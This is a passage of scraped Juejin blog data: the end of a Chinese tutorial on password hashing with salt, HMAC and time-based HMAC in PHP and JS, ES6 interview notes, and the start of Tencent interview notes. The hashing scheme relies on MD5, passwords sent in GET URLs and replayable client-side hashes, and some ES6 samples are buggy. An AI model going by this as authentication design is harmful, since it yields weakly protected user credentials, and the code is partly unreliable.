href=\"https://link.juejin.im?target=http%3A%2F%2Fcmd5.com%2F%EF%BC%8C%E5%BE%88%E5%AE%B9%E6%98%93%E5%B0%B1%E8%A2%AB%E7%A0%B4%E8%A7%A3%E4%BA%86%E5%AF%86%E7%A0%81%EF%BC%8C%E6%80%8E%E4%B9%88%E5%8A%9E%E5%91%A2%EF%BC%9F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">cmd5.com/，很容易就被破解了密码…</a></p>\n<h2 id=\"-\" data-id=\"heading-1\">加盐</h2>\n<p>工作一段时间的同学对这个名词应该不会陌生，这种方式算是给用户的隐私数据加上密了，其实就是一段隐私数据加一段乱码再进行 md5，用代码表示大致是这样：</p>\n<pre><code class=\"hljs python\">// 伪代码\nsalt = <span class=\"hljs-string\">'#^&amp;%**(^&amp;(&amp;*)_)_(*&amp;^&amp;#$%GVHKBJ(*^&amp;*%^%&amp;^&amp;'</span>\npassword = <span class=\"hljs-string\">'123456'</span>\npost_body = salt + password\n<span class=\"hljs-keyword\">print</span> post_body.md5()\n// ffb34d898f6573a1cf14fdc34d3343c0</code></pre><p>现在，密码看起来挺靠谱的了，但是，我们知道加盐这种方式是比较早期的处理方式了，既然现在没有在大范围使用了，就说明单纯加盐还是存在缺陷的。</p>\n<h3 id=\"-\" data-id=\"heading-2\">有泄露的可能</h3>\n<p>现在我们在客户端对密码做了 md5 加盐，服务器保存的也是加密后的内容，但是，盐是写在了客户端的源代码中，一旦对源代码进行反编译，找到 <code>salt</code> 这个字符串，那么加盐的做法也就形同虚设了。</p>\n<p>反编译源代码的代价也很高，一般对于安全性能要求不高的话，也够用了，但是，对于一些涉及资金之类的 App  来说，仅仅加盐还是不够的。</p>\n<p>比如离职的技术同学不是很开心，又或者有人想花钱买这串字符等等，盐一旦被泄露，就是一场灾难，这也是盐最大的缺陷。</p>\n<h3 id=\"-\" data-id=\"heading-3\">依赖性太强</h3>\n<p>盐一旦被设定，那么再做修改的话就非常困难了，因为服务器存储的全部是加盐后的数据，如果换盐，那么这些数据全部都需要改动。<strong>但是可怕的不在于此，如果将服务器的数据改动后，旧版本的用户再访问又都不可以了，因为他们用的是之前的盐。</strong></p>\n<h2 id=\"hmac\" data-id=\"heading-4\">HMAC</h2>\n<p>目前最常见的方式，应该就是 HMAC 了，HMAC 算法主要应用于身份验证，与加盐的不同点在于，盐被移到了服务器，服务器返回什么，就用什么作为盐。</p>\n<p>这么做有什么好处呢？ 如果我们在登录的过程中，黑客截获了我们发送的数据，他也只能得到 HMAC 加密过后的结果，由于不知道密钥，根本不可能获取到用户密码，从而保证了安全性。</p>\n<p>但是还有一个问题，前面我们讲到，<strong>盐被获取以后很危险，如果从服务器获取盐，也会被抓包，那还不如写在源代码里面呢，至少被反编译还困难点，那如果解决这个隐患呢</strong>？</p>\n<p>那就是，在用户注册时就生成和获取这个秘钥，以代码示例：</p>\n<p>现在我们发送一个请求：</p>\n<pre><code class=\"hljs bash\">GET http://localhost:8888/capsule/register.php?account=joy&amp;password=789</code></pre><p>服务器收到请求后，做了下面的事情：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-comment\">/*获取 get 请求传递的参数*/</span>\n$account = $_GET[<span class=\"hljs-string\">'account'</span>];\n$password = $_GET[<span class=\"hljs-string\">'password'</span>];  <span class=\"hljs-comment\">//123456</span>\n\n<span class=\"hljs-comment\">/*创建数据连接*/</span>\n$db = <span class=\"hljs-keyword\">new</span> DataBase();\n\n<span class=\"hljs-comment\">/*制作一个随机的盐*/</span>\n$salt = salt();\n\n<span class=\"hljs-comment\">/*检查用户名是否存在*/</span>\n$is_exist = $db-&gt;check_user_exist($account);\n\n<span class=\"hljs-keyword\">if</span> ($is_exist) {\n    <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">10001</span>, <span class=\"hljs-keyword\">false</span>);\n}\n<span class=\"hljs-keyword\">else</span> {\n\n    <span class=\"hljs-comment\">/*将密码进行 hmac 加密*/</span>\n    $password = str_hmac($password,  $salt);\n\n    <span class=\"hljs-comment\">/*检查用户名是否添加成功*/</span>\n    $result = $db-&gt;add_user($account, $password);\n\n    <span class=\"hljs-keyword\">if</span> ($result) {\n        $data = [<span class=\"hljs-string\">'salt'</span>=&gt;$salt];\n        <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">0</span>, $data);\n        <span class=\"hljs-comment\">//echo response(0, true);</span>\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">20001</span>, <span class=\"hljs-keyword\">false</span>);\n    }\n}</code></pre><p>服务器现在保存的是：</p>\n<pre><code class=\"hljs bash\">account: joy\npassword: 05575c24576</code></pre><p>客户端拿到的结果是：</p>\n<pre><code class=\"hljs json\">{\n  <span class=\"hljs-attr\">\"rc\"</span>: <span class=\"hljs-number\">0</span>,\n  <span class=\"hljs-attr\">\"data\"</span>: {\n    <span class=\"hljs-attr\">\"salt\"</span>: <span class=\"hljs-string\">\"5633905fdc65b6c57be8698b1f0e884948c05d7f\"</span>\n  },\n  <span class=\"hljs-attr\">\"errorInfo\"</span>: <span class=\"hljs-string\">\"\"</span>\n}</code></pre><p>那么客户端接下来应该做什么呢？把 <code>salt</code> 做本地的持久化，登录时将用户输入的密码做一次同样的 hmac，那么就能通过服务器的 <code>password: 05575c24576</code> 校验了，发起登录请求：</p>\n<pre><code class=\"hljs bash\">GET http://localhost:8888/capsule/login.php?account=joy&amp;password=789 \n// fail\nGET http://localhost:8888/capsule/login.php?account=joy&amp;password=05575c24576 \n// success</code></pre><p>现在我们解决了依赖性太强的问题，盐我们可以随意的更改，甚至可以是随机的，每个用户都不一样。这样单个用户的安全性虽然没有加强，但是整个平台的安全性缺大大提升了，很少有人会针对一个用户搞事情。但是细心的同学应该可以想到，现在的盐，也就是秘钥是保存在本地的，如果用户的秘钥丢失，比如换手机了，那么岂不是<strong>有正确的密码，也无法登陆了吗</strong>？</p>\n<p>针对这个问题，核心就是用户没有了秘钥，那么在用户登陆的时候，逻辑就需要变一下。</p>\n<pre><code class=\"hljs swift\"><span class=\"hljs-comment\">// 伪代码</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">login</span><span class=\"hljs-params\">(account, password)</span></span> {\n    <span class=\"hljs-comment\">//如果有盐</span>\n    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">let</span> salt = getSalt() {\n        <span class=\"hljs-comment\">//将密码进行 hmac，请求登陆接口</span>\n        network.login(account, password.hmac(salt))\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-comment\">//请求 getSalt 接口，请求参数为账户+应用标识</span>\n        network.getSalt(account + bundleId, { salt <span class=\"hljs-keyword\">in</span>\n            <span class=\"hljs-comment\">//将盐保存在本地，再次调用自身。</span>\n            savaSalt(salt)\n            login(account, password)\n        })\n    }\n}</code></pre><p>那么可想而知，我们的注册接口现在也需要新加一个 <code>bundleId</code> 的请求参数，然后用 <code>account + bundleId</code> 作为 key，来保存 <code>salt</code>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-comment\">/*获取 get 请求传递的参数*/</span>\n$account = $_GET[<span class=\"hljs-string\">'account'</span>];\n$password = $_GET[<span class=\"hljs-string\">'password'</span>];  <span class=\"hljs-comment\">//123456</span>\n$bundle_id = $_GET[<span class=\"hljs-string\">'bundleId'</span>];\n\n<span class=\"hljs-comment\">/*创建数据连接*/</span>\n$db = <span class=\"hljs-keyword\">new</span> DataBase();\n\n<span class=\"hljs-comment\">/*制作一个随机的盐*/</span>\n$salt = salt();\n\n<span class=\"hljs-comment\">/*检查用户名是否存在*/</span>\n$is_exist = $db-&gt;check_user_exist($account);\n\n<span class=\"hljs-keyword\">if</span> ($is_exist) {\n    <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">10001</span>, <span class=\"hljs-keyword\">false</span>);\n}\n<span class=\"hljs-keyword\">else</span> {\n    <span class=\"hljs-comment\">/*将密码进行 hmac 加密*/</span>\n    $password = str_hmac($password,  $salt);\n\n    <span class=\"hljs-comment\">/*检查用户名是否添加成功*/</span>\n    $result = $db-&gt;add_user($account, $password);\n\n    <span class=\"hljs-keyword\">if</span> ($result) {\n\n        <span class=\"hljs-comment\">/*检查秘钥是否保存成功*/</span>\n        $save_salt = $db-&gt;save_salt($salt, $account, $bundle_id);\n\n        <span class=\"hljs-keyword\">if</span> ($save_salt) {\n            $data = [<span class=\"hljs-string\">'salt'</span>=&gt;$salt];\n            <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">0</span>, $data);\n        }\n        <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">20001</span>, <span class=\"hljs-keyword\">false</span>);\n        }\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">20001</span>, <span class=\"hljs-keyword\">false</span>);\n    }\n}</code></pre><p>同时我们需要创建一个获取 <code>salt</code> 的接口：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-comment\">/*获取 get 请求传递的参数*/</span>\n$account = $_GET[<span class=\"hljs-string\">'account'</span>];\n$bundle_id = $_GET[<span class=\"hljs-string\">'bundleId'</span>];\n\n<span class=\"hljs-comment\">/*创建数据连接*/</span>\n$db = <span class=\"hljs-keyword\">new</span> DataBase();\n\n<span class=\"hljs-comment\">/*获取秘钥*/</span>\n$salt = $db-&gt;get_salt($account, $bundle_id);\n\n<span class=\"hljs-keyword\">if</span> ($salt == <span class=\"hljs-string\">''</span>) {\n    <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">40001</span>, <span class=\"hljs-keyword\">false</span>);\n}\n<span class=\"hljs-keyword\">else</span> {\n    $data = [<span class=\"hljs-string\">'salt'</span>=&gt;$salt];\n    <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">0</span>, $data);\n}</code></pre><p>写到这里，就可以给大家介绍一个比较好玩的东西了。</p>\n<h3 id=\"-\" data-id=\"heading-5\">设备锁</h3>\n<p>一些 App 具有设备锁的功能，比如 QQ，这个功能是将账号与设备进行绑定，如果其他人知道了用户的账号和密码，但是设备不符，同样无法登录，怎样实现呢？</p>\n<p>就是用户开启设备锁之后，如果设备中没有 <code>salt</code>，那么就不再请求 <code>getSalt</code> 接口，而是转为其他验证方式，通过之后，才可以请求 <code>getSalt</code>。</p>\n<h3 id=\"-\" data-id=\"heading-6\">提升单个用户的安全性</h3>\n<p>现在这个 App 相对来说比较安全了，上面说到，因为每个用户的 <code>salt</code> 都不一样，破解单个用户的利益不大，所以，对于平台来说安全性已经比较高了，但凡是都有例外，如果这个破坏者就是铁了心要搞事情，就针对一个用户，现在这个方案，还有哪些问题存在呢？</p>\n<ol>\n<li>注册时返回的 <code>salt</code> 被抓包时有可能会泄露；</li>\n<li>更换设备后，获取的 <code>salt</code> 被抓包时有可能会泄露；</li>\n<li>保存在本地的 <code>salt</code> ，有可能通过文件路径获取到；</li>\n<li><p>抓包的人就算不知道密码，通过 hmac 加密后的字符，也可以进行登录；</p>\n<p>怎么处理呢？首先我们需要清楚的是，之所以会被破解，是拿到了我们加密时的因子，或者叫种子，这个种子服务器和客户端都必须要有，如果没有的话，两者就无法进行通信了，但是我们也不能在客户端将种子写死，在服务器给客户端种子时，总会有可能被获取。</p>\n</li>\n</ol>\n<p>我们要设计一种思路，需要有一个种子，服务器和客户端之间无需通讯，但是都可以被理解的种子。</p>\n<p>同时我们需要这个种子是动态的，每次加密的结果都不一样，那么就算抓到了加密后的密码，这个密码也随之失效了。</p>\n<p><strong>所以，我们需要一个无需服务器和客户端通讯的，动态的种子，时间。</strong></p>\n<h2 id=\"hmac-\" data-id=\"heading-7\">HMAC+时间</h2>\n<p>这个动态的种子是如何使用的呢？</p>\n<ol>\n<li>客户端发送注册请求，服务器返回 <code>salt</code>，保存 hmac 后的密码；</li>\n<li>客户端保存 <code>salt</code>；</li>\n<li>客户端发送登录请求，参数为 hmac 后的密码，加上当前的时间；</li>\n<li>服务器收到登录请求，将数据库中的密码，加上当前的时间，进行比对；</li>\n</ol>\n<p>客户端代码：</p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 秘钥</span>\n<span class=\"hljs-keyword\">const</span> salt = <span class=\"hljs-string\">''</span>\n<span class=\"hljs-comment\">// 当前时间，精确到分钟</span>\n<span class=\"hljs-keyword\">const</span> currentTime = <span class=\"hljs-string\">'201709171204'</span>\n<span class=\"hljs-comment\">// 用户输入的密码</span>\n<span class=\"hljs-keyword\">let</span> password = <span class=\"hljs-string\">'123456'</span>\n<span class=\"hljs-comment\">// (hmac+currentTime).md5</span>\npassword = (password.hmac(salt) + currentTime).md5()\nnetwork(<span class=\"hljs-string\">'login'</span>, {<span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span>, <span class=\"hljs-attr\">params</span>: {<span class=\"hljs-attr\">password</span>:password}})</code></pre><p>服务器代码：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">should_login</span><span class=\"hljs-params\">($account, $password)</span>\n</span>{\n    $account = mysqli_real_escape_string(<span class=\"hljs-keyword\">$this</span>-&gt;connection ,$account);\n    $password = mysqli_real_escape_string(<span class=\"hljs-keyword\">$this</span>-&gt;connection, $password);\n    $user = <span class=\"hljs-keyword\">$this</span>-&gt;get_user($account);\n    <span class=\"hljs-keyword\">if</span> ($user == <span class=\"hljs-keyword\">null</span>) {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">false</span>;\n    }\n    $password_local = $user[<span class=\"hljs-string\">'password'</span>];\n    <span class=\"hljs-keyword\">if</span> ($password_local == <span class=\"hljs-string\">''</span>) {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">false</span>;\n    }\n    $password_local = md5($password_local.current_time());\n    <span class=\"hljs-keyword\">if</span> ($password_local == $password) {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">true</span>;\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">false</span>;\n    }\n}</code></pre><p>但是现在还有一点问题，那就是对时间的容错上，如果客户端发送的时候是 <code>201709171204</code>，服务器响应时却已经到了 <code>201709171205</code> 了，那么这样势必是不能通过的，这种情况，只需要服务器把当前的时间减去一分钟，再校验一次，符合其中之一就可以。</p>\n<p>聪明的你应该可以想到，这也就是<strong>验证码 5 分钟内有效期的实现</strong>。</p>\n<p>现在这个 App，就算注册时拿到了 <code>salt</code>，也很难在 1 分钟内反推出密码，同时，抓包的密码一分钟后也就失效了，对于单个用户的安全性，也有了进一步的提升。</p>\n</div>"},{"title":"前端面试之ES6篇（高产似母猪）","avatar":"https://avatars3.githubusercontent.com/u/24629298?v=4","author":"skychenbo","create_time":"2017 年 09 月 25 日","tags":["前端","面试","Vue.js","JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>这也是前端面试经常询问的问题，经常问你es6出现了哪些新的特性，平时又使用过那些。在编写此教程的时候，第一句话往往就是面试常常问到的地方，然后后面就是他的详细解释，面试要求的内容我会用*标记出来。写技术文档是真的累啊，虽然是看别人的文档，但是你得看很多，而且还得自己总结啊。所以说要是觉得对你有用还是帮我点个star吧<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fskychenbo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/skychenbo</a></p>\n<pre><code class=\"hljs bash\">1、箭头函数需要注意的地方\n2、ES6 <span class=\"hljs-built_in\">let</span>、const\n3、<span class=\"hljs-built_in\">set</span>数据结构\n4、promise对象的用法,手写一个promise\n5、class的理解\n6、模版语法的理解\n7、rest参数\n8、    module体系</code></pre><h2 id=\"-\" data-id=\"heading-0\">箭头函数需要注意的地方</h2>\n<p>*当要求动态上下文的时候，就不能够使用箭头函数。也就是this的固定化<br>1、在使用=&gt;定义函数的时候，this的指向是定义时所在的对象，而不是使用时所在的对象<br>2、不能够用作构造函数，这就是说，不能够使用new命令，否则就会抛出一个错误<br>3、不能够使用arguments对象<br>4、不能使用yield命令<br>这是一道当年很困惑我的一道题不知道你在第一眼能不能看出其结果,this的指向总是让人困扰，但是有了=&gt;以后妈妈再也不用担心你使用this了</p>\n<pre><code class=\"hljs bash\">class Animal {\n    <span class=\"hljs-function\"><span class=\"hljs-title\">constructor</span></span>(){\n        this.type = <span class=\"hljs-string\">'animal'</span>\n    }\n    says(say) {\n        <span class=\"hljs-built_in\">set</span>Timeout(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n            console.log(this.type + <span class=\"hljs-string\">'says'</span> + say)\n        },1000)\n    }\n}\nvar animal = new Animal()\nanimal.says(<span class=\"hljs-string\">'hi'</span>) // undefined says hi</code></pre><p>我们再来看看=&gt;的情况</p>\n<pre><code class=\"hljs bash\">class <span class=\"hljs-function\"><span class=\"hljs-title\">Animal</span></span>() {\n    <span class=\"hljs-function\"><span class=\"hljs-title\">constructor</span></span>() {\n        this.type = <span class=\"hljs-string\">'animal'</span>\n    }\n    says(say) {\n        <span class=\"hljs-built_in\">set</span>Timeout(() =&gt; {\n            console.log(this.type + <span class=\"hljs-string\">' says '</span> + say)\n        }, 1000)\n    }\n}\nvar animal = new Animal()\nanimal.says(<span class=\"hljs-string\">'hi'</span>) // animal says hi</code></pre><p> ES6 let、const<br>*let是更完美的var，不是全局变量，具有块级函数作用域,大多数情况不会发生变量提升。const定义常量值，不能够重新赋值，如果值是一个对象，可以改变对象里边的属性值<br>let<br>1、let声明的变量具有块级作用域<br>2、let声明的变量不能通过window.变量名进行访问<br>3、形如for(let x..)的循环是每次迭代都为x创建新的绑定<br>下面是var带来的不合理场景</p>\n<pre><code class=\"hljs bash\">var a = []\n<span class=\"hljs-keyword\">for</span> (var i = 0; i &lt; i; i++) {\n    a[i] = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        console.log(i)\n    }\n}\na[5]() // 10</code></pre><p>在上述代码中，变量i是var声明的，在全局范围类都有效。所以每一次循环，新的i值都会覆盖旧值，导致最后输出都是10<br>而如果对循环使用let语句的情况，那么每次迭代都是为x创建新的绑定代码如下</p>\n<pre><code class=\"hljs bash\">var a = []\n<span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0; i &lt; i; i++) {\n    a[i] = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        console.log(i)\n    }\n}\na[5]() // 5</code></pre><p>当然除了这种方式让数组中的各个元素分别是不同的函数，我们还可以采用闭包和立即函数两种方法<br>这是闭包的方法</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">function</span> showNum(i) {\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        console.log(i)\n    }\n}\nvar a = []\n<span class=\"hljs-keyword\">for</span> (var i = 0; i &lt; 5; i++) {\n    a[i] = showNum(i)\n}</code></pre><p>这是立即函数的方法</p>\n<pre><code class=\"hljs bash\">var a = []\n<span class=\"hljs-keyword\">for</span> (var i = 0; i &lt; 5; i++) {\n    a[i] = (<span class=\"hljs-keyword\">function</span> (i) {\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n            console.log(i)\n        }\n    })(i)\n}\na[2]()</code></pre><h2 id=\"set-\" data-id=\"heading-1\">Set数据结构</h2>\n<p>*es6方法,Set本身是一个构造函数，它类似于数组，但是成员值都是唯一的</p>\n<pre><code class=\"hljs bash\">const <span class=\"hljs-built_in\">set</span> = new Set([1,2,3,4,4])\n[...set] // [1,2,3,4]\nArray.from(new Set())是将<span class=\"hljs-built_in\">set</span>进行去重</code></pre><h2 id=\"promise-promise\" data-id=\"heading-2\">promise对象的用法,手写一个promise</h2>\n<p>promise是一个构造函数，下面是一个简单实例</p>\n<pre><code class=\"hljs bash\">var promise = new Promise((resolve,reject) =&gt; {\n    <span class=\"hljs-keyword\">if</span> (操作成功) {\n        resolve(value)\n    } <span class=\"hljs-keyword\">else</span> {\n        reject(error)\n    }\n})\npromise.then(<span class=\"hljs-keyword\">function</span> (value) {\n    // success\n},<span class=\"hljs-keyword\">function</span> (value) {\n    // failure\n})</code></pre><h2 id=\"class-\" data-id=\"heading-3\">Class的讲解</h2>\n<p>*class语法相对原型、构造函数、继承更接近传统语法，它的写法能够让对象原型的写法更加清晰、面向对象编程的语法更加通俗<br>这是class的具体用法</p>\n<pre><code class=\"hljs bash\">class Animal {\n    <span class=\"hljs-function\"><span class=\"hljs-title\">constructor</span></span> () {\n        this.type = <span class=\"hljs-string\">'animal'</span>\n    }\n    says(say) {\n        console.log(this.type + <span class=\"hljs-string\">'says'</span> + say)\n    }\n}\n <span class=\"hljs-built_in\">let</span> animal = new Animal()\n animal.says(<span class=\"hljs-string\">'hello'</span>) // animal says hello\n\n class Cat extends Animal {\n     <span class=\"hljs-function\"><span class=\"hljs-title\">constructor</span></span>() {\n         super()\n         this.type = <span class=\"hljs-string\">'cat'</span>\n     }\n }\n <span class=\"hljs-built_in\">let</span> cat = new Cat()\n cat.says(<span class=\"hljs-string\">'hello'</span>) // cat says hello</code></pre><p> 可以看出在使用extend的时候结构输出是cat says hello 而不是animal says hello。说明contructor内部定义的方法和属性是实例对象自己的，不能通过extends 进行继承。在class cat中出现了super(),这是什么呢<br> 在ES6中，子类的构造函数必须含有super函数，super表示的是调用父类的构造函数，虽然是父类的构造函数，但是this指向的却是cat<br>    Object.assign 方法<br>var n = Object.assign(a,b,c)向n中添加a,b,c的属性</p>\n<h2 id=\"-\" data-id=\"heading-4\">模版语法</h2>\n<p>*就是这种形式<code>${varible}</code>,在以往的时候我们在连接字符串和变量的时候需要使用这种方式'string' + varible + 'string'但是有了模版语言后我们可以使用<code>string${varible}string</code>这种进行连接</p>\n<h2 id=\"rest-\" data-id=\"heading-5\">rest参数</h2>\n<p>*es6引入rest参数，用于获取函数的多余参数，这样就不需要使用arguments对象了<br>ex: </p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">function</span> add(...values) {\n    <span class=\"hljs-built_in\">let</span> sum = 0\n    <span class=\"hljs-keyword\">for</span>(var val of values) {\n        sum += val\n    }\n    <span class=\"hljs-built_in\">return</span> sum\n}</code></pre><h2 id=\"module-\" data-id=\"heading-6\">module体系</h2>\n<p>*历史上js是没有module体系，无法将一个大程序拆分成一些小的程序。在es6之前，有commonJs,AMD两种<br>CommonJS是如何书写的呢</p>\n<pre><code class=\"hljs bash\">const animal = require(<span class=\"hljs-string\">'./content.js'</span>)\n    // content.js\n    module.exports = <span class=\"hljs-string\">'a cat'</span></code></pre><p>require.js是这样做的<br>// content.js</p>\n<pre><code class=\"hljs bash\">define(<span class=\"hljs-string\">'content.js'</span>, <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">'A cat'</span>\n})\n\nrequire([<span class=\"hljs-string\">'./content.js'</span>], <span class=\"hljs-keyword\">function</span> (animal) {\n    console.log(animal) // a cat\n})</code></pre><p>ES6的语法（在我用的vue中，就使用的是这个）</p>\n<pre><code class=\"hljs bash\">import animal from <span class=\"hljs-string\">'./content'</span>\n// content.js\n<span class=\"hljs-built_in\">export</span> default <span class=\"hljs-string\">'a cat'</span></code></pre><p>es6 import的其他用法<br>在vue中可以 import animal from './content'<br>animal这个值可以根据你的喜欢而改变，但是有一个问题就是如果一旦引入的是函数或者变量时，你就必须和content中的名字保持一致，可以参照<br>import { say, type } from './content'<br>常用的还有一种写法<br>import * as content from './content'<br>这种写法就是表示所有的输出值都在这个对象上</p>\n</div>"},null,null,null,{"title":"腾讯校招前端三面,虐完继续撸|掘金技术征文","avatar":"https://user-gold-cdn.xitu.io/2017/9/25/912339d04ae8cc3b83fea9b6dde0ee5c?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"天道酬勤_我萌我赢","create_time":"2017 年 09 月 25 日","tags":["面试","腾讯","掘金技术征文"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>上星期，参加了腾讯前端校招三次面试，一次电话，两次现场面试。问到的知识广度很全面，深度让人也有点无奈，大部分很多东西平时确实没有深究，深究可能也只是看看别人的博客，没有自己敲代码来实现，问到就会有些模糊，答得不是很好。特别是第三面，让腾讯大佬问得哑口无言，当时真的是欲哭无泪。休整了两天，准备将前端面试的知识点整理一下，分享给大家，后面还有很多互联网公司，希望大家也能够找到一份好工作。</p>\n<p><strong>如果您喜欢这篇文章，可以点个赞，本文会很长，建议您收藏下来，方便日后回顾</strong></p>\n<p><strong>我这里会将所有的知识点都列出来，并附上完整的答案，但是有些问题答案太多，一句两句说不清，我会将我觉得不错的答案链接放上来，以便大家按需取用</strong></p>\n<p><strong>-----------底部有更新---------------9.26---------------------放上了三面的问题-------------</strong></p>\n<p><strong>下面的知识点主要从基础知识（HTML+CSS）,JavaScript(包括node，angular)，前端综合知识（HTTP，缓存，性能优化，性能监控，跨域等）展开</strong></p>\n<h1 id=\"-\" data-id=\"heading-0\">基础知识</h1>\n<p><strong>1.html5有哪些新特性、移除了那些元素？（这是一个很经典的问题，基本上都会问到，当然后面会展开部分知识点）</strong><br>新特性<br>（1）语意化更好的内容元素，比如 article、footer、header、nav、section，<br>表单控件，calendar、date、time、email、url、search;<br>（2）一些功能标签，如绘画 canvas，用于媒介播放的 video 和 audio 元素;<br>（3）本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失;<br>sessionStorage 的数据在浏览器关闭后自动删除;<br>（4）新的技术，如webworker, websocket, Geolocation;<br>移除的元素：<br>（1）纯表现的元素：basefont，big，center，font, s，strike，tt，u;<br>（2）对可用性产生负面影响的元素：frame，frameset，noframes；</p>\n<p><strong>2. cookies，session,sessionStroage和localStorage的区别</strong><br>首先要分清的是，cookies，sessionStroage和localStorage是在客户端，session是在服务器端。服务器端的session机制， session 对象数据保存在服务器上。实现上，服务器和浏览器之间仅需传递session id即可，服务器根据session id找到对应用户的session对象。会话数据仅在一段时间内有效，这个时间就是server端设置的session有效期。服务器session存储数据安全一些，一般存放用户信息，浏览器只适合存储一般数据<br>其次，是cookies，sessionStroage和localStorage三者的区别<br>（1）cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递。而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。<br>（2）存储大小限制也不同，cookie数据不能超过4k，同时因为每次Http请求都会携带cookie（这里可能还会追问，cookie是在http报文什么地方，答:cookie是携带在http请求头上的），所以cookie只适合保存很小的数据，比如会话标识sessionStroage和localstroage虽然也有大小限制，但是比cookie大很多，可以达到5M；<br>（3） 数据有效期也不同，cookie在设置的有效期（服务端设置）内有效，不管窗口或者浏览器是否关闭，sessionStroage仅在当前浏览器窗口关闭前有效（也就是说只要这个浏览器窗口没有关闭，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后，sessionStorage即被销毁）；localStroage始终有效，窗口或者浏览器关闭也一直保存；<br>（4） Web storage 支持事件通知机制，可以将数据更新的通知发送给监听者。如下：</p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-built_in\">window</span>.addEventListener(<span class=\"hljs-string\">\"storage\"</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">e</span>) </span>{\n        alert(e.newValue);\n    });</code></pre><blockquote>\n<p>Web Storage带来的好处：<br> 减少网络流量：一旦数据保存在本地后，就可以避免再向服务器请求数据，因此减少不必要的数据请求，减少数据在浏览器和服务器间不必要地来回传递。<br> 快速显示数据：性能好，从本地读数据比通过网络从服务器获得数据快得多，本地数据可以即时获得。再加上网页本身也可以有缓存，因此整个页面和数据都在本地的话，可以立即显示。<br> 临时存储：很多时候数据只需要在用户浏览一组页面期间使用，关闭窗口后数据就可以丢弃了，这种情况使用sessionStorage非常方便。</p>\n</blockquote>\n<p><strong>3.meta标签有哪些？<a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fqiumohanyu%2Fp%2F5431859.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">点这里</a></strong></p>\n<p><strong>4.布局方面 <a href=\"https://link.juejin.im?target=http%3A%2F%2Fbrianway.github.io%2F2017%2F05%2F18%2Fcss-layout-classical-problems%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">参考这一篇</a></strong></p>\n<p><strong>5.BFC概念及使用<a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.jianshu.com%2Fp%2Ffc4c2d8a0018\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">BFC概念及使用</a></strong></p>\n<p><strong>6.flexbox <a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2015%2F07%2Fflex-grammar.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">阮一峰</a></strong></p>\n<p><strong>7.CSS如何实现居中<a href=\"https://link.juejin.im?target=http%3A%2F%2Fblog.csdn.net%2Fchenmoquan%2Farticle%2Fdetails%2F41547609\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CSS实现居中的7种方法</a></strong></p>\n<h1 id=\"javascript\" data-id=\"heading-1\">JavaScript</h1>\n<p><strong>1.数据类型判断</strong><br>尤其是Object.prototype.toString，是个神器<a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fdushao%2Fp%2F5999563.html\" target=\"_blank\" 